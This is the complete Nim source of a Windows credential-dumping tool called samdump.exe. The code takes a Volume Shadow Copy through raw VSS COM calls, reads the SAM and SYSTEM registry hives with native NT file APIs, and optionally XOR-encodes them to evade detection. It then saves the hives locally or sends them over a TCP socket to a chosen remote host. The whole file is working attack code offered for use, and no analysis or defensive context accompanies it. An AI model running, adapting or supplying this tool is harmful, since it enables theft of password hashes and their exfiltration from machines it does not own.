import os, net, strutils, parseopt

const
  DEBUG_LEVEL = 1
  FILE_READ_DATA: uint32 = 0x0001
  FILE_WRITE_DATA: uint32 = 0x0002
  FILE_READ_ATTRIBUTES: uint32 = 0x0080
  FILE_WRITE_ATTRIBUTES: uint32 = 0x0100
  SYNCHRONIZE: uint32 = 0x00100000
  FILE_SHARE_READ: uint32 = 0x00000001
  FILE_OPEN: uint32 = 0x00000001
  FILE_OVERWRITE_IF: uint32 = 0x00000005
  FILE_SYNCHRONOUS_IO_NONALERT: uint32 = 0x00000020
  FILE_ATTRIBUTE_NORMAL: uint32 = 0x00000080
  OBJ_CASE_INSENSITIVE: uint32 = 0x00000040
  COINIT_MULTITHREADED: uint32 = 0x0
  VSS_CTX_BACKUP: int32 = 0
  VSS_CTX_ALL: int32 = -1'i32
  VSS_BT_FULL: int32 = 1
  VSS_OBJ_NONE: int32 = 1
  VSS_OBJ_SNAPSHOT: int32 = 3

  # IVssBackupComponents vtable indices
  BC_RELEASE = 2
  BC_INITIALIZE_FOR_BACKUP = 5
  BC_SET_BACKUP_STATE = 6
  BC_GATHER_WRITER_METADATA = 9
  BC_PREPARE_FOR_BACKUP = 14
  BC_SET_CONTEXT = 35
  BC_START_SNAPSHOT_SET = 36
  BC_ADD_TO_SNAPSHOT_SET = 37
  BC_DO_SNAPSHOT_SET = 38
  BC_GET_SNAPSHOT_PROPERTIES = 42
  BC_QUERY = 43
  BC_IS_VOLUME_SUPPORTED = 44

  # IVssEnumObject vtable indices
  ENUM_RELEASE = 2
  ENUM_NEXT = 3

  # IVssAsync vtable indices
  ASYNC_RELEASE = 2
  ASYNC_WAIT = 4

type
  HANDLE = pointer
  HRESULT = int32

  GUID {.packed.} = object
    data1: uint32
    data2: uint16
    data3: uint16
    data4: array[8, uint8]

  UNICODE_STRING {.packed.} = object
    length: uint16
    maximumLength: uint16
    padding: uint32  # alignment on 64-bit
    buffer: ptr uint16

  OBJECT_ATTRIBUTES = object
    length: uint32
    padding1: uint32  # alignment
    rootDirectory: pointer
    objectName: ptr UNICODE_STRING
    attributes: uint32
    padding2: uint32  # alignment
    securityDescriptor: pointer
    securityQualityOfService: pointer

  IO_STATUS_BLOCK = object
    status: uint32
    padding: uint32
    information: uint

  VssSnapshotProp {.packed.} = object
    snapshotId: GUID
    snapshotSetId: GUID
    snapshotsCount: int32
    padding1: int32
    snapshotDeviceObject: ptr uint16
    originalVolumeName: ptr uint16
    originatingMachine: ptr uint16
    serviceMachine: ptr uint16
    exposedName: ptr uint16
    exposedPath: ptr uint16
    providerId: GUID
    snapshotAttributes: int32
    padding2: int32
    creationTimestamp: int64
    status: int32
    padding3: int32

  VssObjectProp = object
    objType: int32
    padding: int32
    snap: VssSnapshotProp

  Config = object
    saveLocal: bool
    outputDir: string
    sendRemote: bool
    host: string
    port: int
    xorEncode: bool
    xorKey: string
    disk: string

# NT API imports
proc NtCreateFile(fileHandle: ptr pointer, desiredAccess: uint32,
    objectAttributes: ptr OBJECT_ATTRIBUTES, ioStatusBlock: ptr IO_STATUS_BLOCK,
    allocationSize: pointer, fileAttributes: uint32, shareAccess: uint32,
    createDisposition: uint32, createOptions: uint32, eaBuffer: pointer,
    eaLength: uint32): int32 {.importc: "NtCreateFile", dynlib: "ntdll.dll", stdcall.}

proc NtReadFile(fileHandle: pointer, event: pointer, apcRoutine: pointer,
    apcContext: pointer, ioStatusBlock: ptr IO_STATUS_BLOCK, buffer: pointer,
    length: uint32, byteOffset: ptr int64,
    key: pointer): int32 {.importc: "NtReadFile", dynlib: "ntdll.dll", stdcall.}

proc NtWriteFile(fileHandle: pointer, event: pointer, apcRoutine: pointer,
    apcContext: pointer, ioStatusBlock: ptr IO_STATUS_BLOCK, buffer: pointer,
    length: uint32, byteOffset: ptr int64,
    key: pointer): int32 {.importc: "NtWriteFile", dynlib: "ntdll.dll", stdcall.}

proc NtClose(handle: pointer): int32 {.importc: "NtClose", dynlib: "ntdll.dll", stdcall.}

# COM imports
proc CoInitializeEx(reserved: pointer,
    coInit: uint32): HRESULT {.importc: "CoInitializeEx", dynlib: "ole32.dll", stdcall.}
proc CoUninitialize() {.importc: "CoUninitialize", dynlib: "ole32.dll", stdcall.}

# Kernel32 imports
proc LoadLibraryW(fileName: ptr uint16): pointer {.importc: "LoadLibraryW",
    dynlib: "kernel32.dll", stdcall.}
proc GetProcAddress(module: pointer,
    procName: cstring): pointer {.importc: "GetProcAddress", dynlib: "kernel32.dll", stdcall.}

# Shell32 imports
proc IsUserAnAdmin(): int32 {.importc: "IsUserAnAdmin", dynlib: "shell32.dll", stdcall.}

# VssApi function types
type
  CreateVssBackupComponentsFn = proc(ppBackup: ptr pointer): HRESULT {.stdcall.}
  VssFreeSnapshotPropertiesFn = proc(pProp: ptr VssSnapshotProp) {.stdcall.}


proc toWide(s: string): seq[uint16] =
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(ord(c))
  result[s.len] = 0

proc wideToString(p: ptr uint16): string =
  if p == nil:
    return ""
  result = ""
  var i = 0
  while true:
    let c = cast[ptr uint16](cast[uint](p) + uint(i * 2))[]
    if c == 0: break
    result.add(chr(int(c)))
    inc i

proc getVtblSlot(comObj: pointer, index: int): pointer =
  let vtbl = cast[ptr pointer](comObj)[]
  result = cast[ptr pointer](cast[uint](vtbl) + uint(index * sizeof(pointer)))[]

proc comRelease(comObj: pointer) =
  type ReleaseFn = proc(this: pointer): uint32 {.stdcall.}
  let fn = cast[ReleaseFn](getVtblSlot(comObj, 2))
  discard fn(comObj)

proc loadVssFunctions(): (CreateVssBackupComponentsFn, VssFreeSnapshotPropertiesFn) =
  var dllName = toWide("VssApi.dll")
  let vssHandle = LoadLibraryW(addr dllName[0])
  if vssHandle == nil:
    quit("[-] Error: Could not load VssApi.dll", 1)

  let possibleNames = [
    "CreateVssBackupComponentsInternal",
    "CreateVssBackupComponents",
    "?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z"
  ]

  var createPtr: pointer = nil
  for name in possibleNames:
    createPtr = GetProcAddress(vssHandle, cstring(name))
    if createPtr != nil:
      break

  if createPtr == nil:
    quit("[-] Error: Could not find CreateVssBackupComponents in VssApi.dll", 1)

  let freePtr = GetProcAddress(vssHandle, cstring("VssFreeSnapshotProperties"))
  if freePtr == nil:
    quit("[-] Error: Could not find VssFreeSnapshotProperties in VssApi.dll", 1)

  result = (cast[CreateVssBackupComponentsFn](createPtr),
            cast[VssFreeSnapshotPropertiesFn](freePtr))

proc vssAsyncWait(asyncPtr: pointer) =
  if asyncPtr == nil: return
  type WaitFn = proc(this: pointer, ms: uint32): HRESULT {.stdcall.}
  let waitFn = cast[WaitFn](getVtblSlot(asyncPtr, ASYNC_WAIT))
  discard waitFn(asyncPtr, 0xFFFFFFFF'u32)
  comRelease(asyncPtr)

proc listShadows(createFn: CreateVssBackupComponentsFn,
    freeFn: VssFreeSnapshotPropertiesFn): string =
  let hr = CoInitializeEx(nil, COINIT_MULTITHREADED)
  if hr < 0 and hr != -2147417850'i32:
    return ""

  var backup: pointer = nil
  let hrCreate = createFn(addr backup)
  if hrCreate < 0 or backup == nil:
    CoUninitialize()
    return ""

  # InitializeForBackup
  type InitFn = proc(this: pointer, xml: pointer): HRESULT {.stdcall.}
  let initFn = cast[InitFn](getVtblSlot(backup, BC_INITIALIZE_FOR_BACKUP))
  var hrInit = initFn(backup, nil)
  if hrInit < 0:
    comRelease(backup)
    CoUninitialize()
    return ""

  # SetContext
  type SetCtxFn = proc(this: pointer, ctx: int32): HRESULT {.stdcall.}
  let setCtxFn = cast[SetCtxFn](getVtblSlot(backup, BC_SET_CONTEXT))
  var hrCtx = setCtxFn(backup, VSS_CTX_ALL)
  if hrCtx < 0:
    hrCtx = setCtxFn(backup, VSS_CTX_BACKUP)
    if hrCtx < 0:
      comRelease(backup)
      CoUninitialize()
      return ""

  # Query
  type QueryFn = proc(this: pointer, qid: ptr GUID, qtype: int32, rtype: int32,
      ppEnum: ptr pointer): HRESULT {.stdcall.}
  let queryFn = cast[QueryFn](getVtblSlot(backup, BC_QUERY))
  var guidNull: GUID
  var enumPtr: pointer = nil
  let hrQuery = queryFn(backup, addr guidNull, VSS_OBJ_NONE, VSS_OBJ_SNAPSHOT,
      addr enumPtr)
  if hrQuery < 0 or enumPtr == nil:
    comRelease(backup)
    CoUninitialize()
    return ""

  # Enumerate
  type NextFn = proc(this: pointer, celt: uint32, prop: ptr VssObjectProp,
      fetched: ptr uint32): HRESULT {.stdcall.}
  let nextFn = cast[NextFn](getVtblSlot(enumPtr, ENUM_NEXT))
  result = ""

  while true:
    var prop: VssObjectProp
    zeroMem(addr prop, sizeof(VssObjectProp))
    var fetched: uint32 = 0
    let hrNext = nextFn(enumPtr, 1, addr prop, addr fetched)
    if hrNext != 0 or fetched == 0:
      break

    if prop.objType == VSS_OBJ_SNAPSHOT:
      if prop.snap.snapshotDeviceObject != nil:
        result = wideToString(prop.snap.snapshotDeviceObject)
        freeFn(addr prop.snap)
        break
      freeFn(addr prop.snap)

  comRelease(enumPtr)
  comRelease(backup)
  CoUninitialize()

proc createShadow(volumePath: string, createFn: CreateVssBackupComponentsFn,
    freeFn: VssFreeSnapshotPropertiesFn): string =
  if DEBUG_LEVEL >= 1:
    echo "[+] Creating Shadow Copy for: " & volumePath

  let hr = CoInitializeEx(nil, COINIT_MULTITHREADED)
  if hr < 0 and hr != -2147417850'i32:
    return ""

  var backup: pointer = nil
  let hrCreate = createFn(addr backup)
  if hrCreate < 0 or backup == nil:
    CoUninitialize()
    return ""

  # InitializeForBackup
  type InitFn = proc(this: pointer, xml: pointer): HRESULT {.stdcall.}
  let initFn = cast[InitFn](getVtblSlot(backup, BC_INITIALIZE_FOR_BACKUP))
  if initFn(backup, nil) < 0:
    comRelease(backup)
    CoUninitialize()
    return ""

  # IsVolumeSupported
  type IsVolFn = proc(this: pointer, prov: ptr GUID, vol: ptr uint16,
      supported: ptr int32): HRESULT {.stdcall.}
  let isVolFn = cast[IsVolFn](getVtblSlot(backup, BC_IS_VOLUME_SUPPORTED))
  var guidNull: GUID
  var volWide = toWide(volumePath)
  var isSupported: int32 = 0
  let hrVol = isVolFn(backup, addr guidNull, addr volWide[0], addr isSupported)
  if hrVol == 0 and isSupported == 0:
    echo "[-] ERROR: Volume does not support VSS"
    comRelease(backup)
    CoUninitialize()
    return ""

  # SetContext
  type SetCtxFn = proc(this: pointer, ctx: int32): HRESULT {.stdcall.}
  let setCtxFn = cast[SetCtxFn](getVtblSlot(backup, BC_SET_CONTEXT))
  if setCtxFn(backup, VSS_CTX_BACKUP) < 0:
    comRelease(backup)
    CoUninitialize()
    return ""

  # SetBackupState
  type SetBSFn = proc(this: pointer, a: int32, b: int32, c: int32,
      d: int32): HRESULT {.stdcall.}
  let setBSFn = cast[SetBSFn](getVtblSlot(backup, BC_SET_BACKUP_STATE))
  discard setBSFn(backup, 0, 0, VSS_BT_FULL, 0)

  # GatherWriterMetadata
  type GatherFn = proc(this: pointer, ppAsync: ptr pointer): HRESULT {.stdcall.}
  let gatherFn = cast[GatherFn](getVtblSlot(backup, BC_GATHER_WRITER_METADATA))
  var asyncMeta: pointer = nil
  if gatherFn(backup, addr asyncMeta) >= 0:
    vssAsyncWait(asyncMeta)

  # StartSnapshotSet
  type StartSSFn = proc(this: pointer, pId: ptr GUID): HRESULT {.stdcall.}
  let startSSFn = cast[StartSSFn](getVtblSlot(backup, BC_START_SNAPSHOT_SET))
  var snapshotSetId: GUID
  if startSSFn(backup, addr snapshotSetId) < 0:
    comRelease(backup)
    CoUninitialize()
    return ""

  # AddToSnapshotSet
  type AddSSFn = proc(this: pointer, vol: ptr uint16, prov: ptr GUID,
      pId: ptr GUID): HRESULT {.stdcall.}
  let addSSFn = cast[AddSSFn](getVtblSlot(backup, BC_ADD_TO_SNAPSHOT_SET))
  var snapshotId: GUID
  if addSSFn(backup, addr volWide[0], addr guidNull, addr snapshotId) < 0:
    comRelease(backup)
    CoUninitialize()
    return ""

  # PrepareForBackup
  type PrepFn = proc(this: pointer, ppAsync: ptr pointer): HRESULT {.stdcall.}
  let prepFn = cast[PrepFn](getVtblSlot(backup, BC_PREPARE_FOR_BACKUP))
  var asyncPrep: pointer = nil
  if prepFn(backup, addr asyncPrep) >= 0:
    vssAsyncWait(asyncPrep)

  # DoSnapshotSet
  type DoSSFn = proc(this: pointer, ppAsync: ptr pointer): HRESULT {.stdcall.}
  let doSSFn = cast[DoSSFn](getVtblSlot(backup, BC_DO_SNAPSHOT_SET))
  var asyncSnap: pointer = nil
  if doSSFn(backup, addr asyncSnap) < 0:
    comRelease(backup)
    CoUninitialize()
    return ""
  vssAsyncWait(asyncSnap)

  # GetSnapshotProperties
  type GetPropFn = proc(this: pointer, pId: ptr GUID,
      pProp: ptr VssSnapshotProp): HRESULT {.stdcall.}
  let getPropFn = cast[GetPropFn](getVtblSlot(backup, BC_GET_SNAPSHOT_PROPERTIES))
  var snapProp: VssSnapshotProp
  zeroMem(addr snapProp, sizeof(VssSnapshotProp))
  let hrProp = getPropFn(backup, addr snapshotId, addr snapProp)
  if hrProp >= 0 and snapProp.snapshotDeviceObject != nil:
    result = wideToString(snapProp.snapshotDeviceObject)
    freeFn(addr snapProp)
  else:
    result = ""

  comRelease(backup)
  CoUninitialize()

proc openFileNt(filePath: string): pointer =
  var widePath = toWide(filePath)

  var unicodeString: UNICODE_STRING
  unicodeString.length = uint16((widePath.len - 1) * 2)
  unicodeString.maximumLength = uint16(widePath.len * 2)
  unicodeString.buffer = addr widePath[0]

  var objectAttributes: OBJECT_ATTRIBUTES
  objectAttributes.length = uint32(sizeof(OBJECT_ATTRIBUTES))
  objectAttributes.rootDirectory = nil
  objectAttributes.objectName = addr unicodeString
  objectAttributes.attributes = OBJ_CASE_INSENSITIVE
  objectAttributes.securityDescriptor = nil
  objectAttributes.securityQualityOfService = nil

  var ioStatus: IO_STATUS_BLOCK
  zeroMem(addr ioStatus, sizeof(IO_STATUS_BLOCK))
  var fileHandle: pointer = nil

  let status = NtCreateFile(addr fileHandle,
      FILE_READ_DATA or FILE_READ_ATTRIBUTES or SYNCHRONIZE,
      addr objectAttributes, addr ioStatus, nil, 0, FILE_SHARE_READ,
      FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, nil, 0)

  if status != 0:
    return nil
  return fileHandle

proc readBytesNt(fileHandle: pointer): seq[uint8] =
  result = @[]
  var byteOffset: int64 = 0

  while true:
    var buffer: array[4096, uint8]
    var ioStatus: IO_STATUS_BLOCK
    zeroMem(addr ioStatus, sizeof(IO_STATUS_BLOCK))

    let status = NtReadFile(fileHandle, nil, nil, nil, addr ioStatus,
        addr buffer[0], uint32(sizeof(buffer)), addr byteOffset, nil)

    if uint32(status) == 0xC0000011'u32:
      break
    if status != 0 and status != 0x103:
      break

    let bytesRead = uint32(ioStatus.information)
    if bytesRead == 0:
      break

    for i in 0..<int(bytesRead):
      result.add(buffer[i])
    byteOffset += int64(bytesRead)

proc readFile(filePath: string, printInfo: bool): seq[uint8] =
  let fileHandle = openFileNt(filePath)
  if fileHandle == nil:
    if printInfo:
      echo "[-] Error: Not possible to open the file."
    return @[]

  result = readBytesNt(fileHandle)
  if DEBUG_LEVEL >= 1 and printInfo:
    echo "[+] Read " & $result.len & " bytes from " & filePath

  discard NtClose(fileHandle)

proc writeFileNt(filePath: string, data: seq[uint8]): bool =
  var widePath = toWide(filePath)

  var unicodeString: UNICODE_STRING
  unicodeString.length = uint16((widePath.len - 1) * 2)
  unicodeString.maximumLength = uint16(widePath.len * 2)
  unicodeString.buffer = addr widePath[0]

  var objectAttributes: OBJECT_ATTRIBUTES
  objectAttributes.length = uint32(sizeof(OBJECT_ATTRIBUTES))
  objectAttributes.rootDirectory = nil
  objectAttributes.objectName = addr unicodeString
  objectAttributes.attributes = OBJ_CASE_INSENSITIVE
  objectAttributes.securityDescriptor = nil
  objectAttributes.securityQualityOfService = nil

  var ioStatus: IO_STATUS_BLOCK
  zeroMem(addr ioStatus, sizeof(IO_STATUS_BLOCK))
  var fileHandle: pointer = nil

  let status = NtCreateFile(addr fileHandle,
      FILE_WRITE_DATA or FILE_WRITE_ATTRIBUTES or SYNCHRONIZE,
      addr objectAttributes, addr ioStatus, nil, FILE_ATTRIBUTE_NORMAL,
      FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, nil, 0)

  if status != 0:
    echo "[-] Error creating file: " & filePath & ". NTSTATUS: 0x" & toHex(
        uint32(status), 8)
    return false

  var byteOffset: int64 = 0
  let wstatus = NtWriteFile(fileHandle, nil, nil, nil, addr ioStatus,
      unsafeAddr data[0], uint32(data.len), addr byteOffset, nil)

  if wstatus != 0:
    echo "[-] Error writing to file: " & filePath & ". NTSTATUS: 0x" & toHex(
        uint32(wstatus), 8)
    discard NtClose(fileHandle)
    return false

  if DEBUG_LEVEL >= 1:
    echo "[+] Written " & $data.len & " bytes to " & filePath

  discard NtClose(fileHandle)
  return true

proc encodeBytes(data: seq[uint8], key: string): seq[uint8] =
  if key.len == 0:
    return data
  result = newSeq[uint8](data.len)
  let keyBytes = cast[seq[uint8]](@(key.toOpenArrayByte(0, key.len - 1)))
  for i in 0..<data.len:
    result[i] = data[i] xor keyBytes[i mod keyBytes.len]

proc saveFilesLocally(samData, systemData: seq[uint8], basePath: string): bool =
  let samPath = "\\??\\" & basePath & "\\sam.txt"
  let systemPath = "\\??\\" & basePath & "\\system.txt"
  var success = true
  if not writeFileNt(samPath, samData):
    echo "[-] Error storing SAM"
    success = false
  if not writeFileNt(systemPath, systemData):
    echo "[-] Error storing SYSTEM"
    success = false
  return success

proc sendFileOverSocket(sock: Socket, filename: string,
    filedata: seq[uint8]): bool =
  var header: array[40, uint8]
  zeroMem(addr header[0], 40)
  let copyLen = min(filename.len, 32)
  for i in 0..<copyLen:
    header[i] = uint8(filename[i])

  let size = uint32(filedata.len)
  header[32] = uint8((size shr 24) and 0xFF)
  header[33] = uint8((size shr 16) and 0xFF)
  header[34] = uint8((size shr 8) and 0xFF)
  header[35] = uint8(size and 0xFF)

  try:
    var headerStr = newString(40)
    copyMem(addr headerStr[0], addr header[0], 40)
    sock.send(headerStr)

    if filedata.len > 0:
      var dataStr = newString(filedata.len)
      copyMem(addr dataStr[0], unsafeAddr filedata[0], filedata.len)
      sock.send(dataStr)

    if DEBUG_LEVEL >= 1:
      echo "[+] " & filename & " sent (" & $filedata.len & " bytes)"
    return true
  except:
    echo "[-] Error sending " & filename
    return false

proc sendFilesRemotely(samData, systemData: seq[uint8], host: string,
    port: int): bool =
  var sock: Socket
  try:
    sock = newSocket()
    sock.connect(host, Port(port))
  except:
    echo "[-] Error connecting to " & host & ":" & $port
    return false

  if DEBUG_LEVEL >= 1:
    echo "[+] Connected to " & host & ":" & $port

  var success = true
  if not sendFileOverSocket(sock, "SAM", samData):
    success = false
  if not sendFileOverSocket(sock, "SYSTEM", systemData):
    success = false

  sock.close()
  return success

proc printHelp() =
  echo "Usage: samdump.exe [OPTIONS]"
  echo "Options:"
  echo "  --save-local           Save locally (default: false)"
  echo "  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)"
  echo "  --send-remote          Send remotely (default: false)"
  echo "  --host IP              Host for remote sending (default: 127.0.0.1)"
  echo "  --port PORT            Port for remote sending (default: 7777)"
  echo "  --xor-encode           XOR Encode (default: false)"
  echo "  --xor-key KEY          XOR key (default: SAMDump2025)"
  echo "  --disk DISK            Disk for shadow copy (default: C:\\)"
  echo "  --help                 Show this help"
  quit(0)

proc parseArguments(): Config =
  result.saveLocal = false
  result.outputDir = "C:\\Windows\\tasks"
  result.sendRemote = false
  result.host = "127.0.0.1"
  result.port = 7777
  result.xorEncode = false
  result.xorKey = "SAMDump2025"
  result.disk = "C:\\"

  var p = initOptParser(shortNoVal = {'h'},
    longNoVal = @["save-local", "send-remote", "xor-encode", "help"])
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      case p.key.toLowerAscii()
      of "save-local":
        result.saveLocal = true
      of "output-dir":
        result.outputDir = p.val
      of "send-remote":
        result.sendRemote = true
      of "host":
        result.host = p.val
      of "port":
        result.port = parseInt(p.val)
      of "xor-encode":
        result.xorEncode = true
      of "xor-key":
        result.xorKey = p.val
      of "disk":
        result.disk = p.val
      of "help", "h":
        printHelp()
      else:
        discard
    of cmdArgument:
      discard

when isMainModule:
  let config = parseArguments()

  if not config.saveLocal and not config.sendRemote:
    printHelp()

  if IsUserAnAdmin() == 0:
    echo "ERROR: Administrator privileges required"
    quit(1)

  let (createFn, freeFn) = loadVssFunctions()

  var shadowBasePath: string
  var newShadowCreated = false

  let existingShadow = listShadows(createFn, freeFn)
  if existingShadow.len > 0:
    if DEBUG_LEVEL >= 1:
      echo "[+] Shadow Copy found: " & existingShadow
    shadowBasePath = existingShadow
  else:
    if DEBUG_LEVEL >= 1:
      echo "[+] No Shadow Copies found: Creating a new one."
    let newShadow = createShadow(config.disk, createFn, freeFn)
    if newShadow.len > 0:
      echo "[+] Shadow copy created: " & newShadow
      shadowBasePath = newShadow
      newShadowCreated = true
    else:
      echo "\n[-] Failed to create a Shadow copy."
      quit(1)

  shadowBasePath = shadowBasePath.replace("\\\\?\\", "\\??\\")

  let samPath = shadowBasePath & "\\windows\\system32\\config\\sam"
  let systemPath = shadowBasePath & "\\windows\\system32\\config\\system"

  var samBytes = readFile(samPath, true)
  var systemBytes = readFile(systemPath, true)

  if newShadowCreated:
    samBytes = readFile(samPath, false)
    systemBytes = readFile(systemPath, false)

  if config.xorEncode:
    samBytes = encodeBytes(samBytes, config.xorKey)
    systemBytes = encodeBytes(systemBytes, config.xorKey)
    if DEBUG_LEVEL >= 1:
      echo "[+] XOR-encoded SAM and SYSTEM content"

  if config.saveLocal:
    if saveFilesLocally(samBytes, systemBytes, config.outputDir):
      if DEBUG_LEVEL >= 1:
        echo "[+] Success saving files locally"
    else:
      echo "[-] Error saving files locally"

  if config.sendRemote:
    if sendFilesRemotely(samBytes, systemBytes, config.host, config.port):
      if DEBUG_LEVEL >= 1:
        echo "[+] Success sending files"
    else:
      echo "[-] Error sending files"
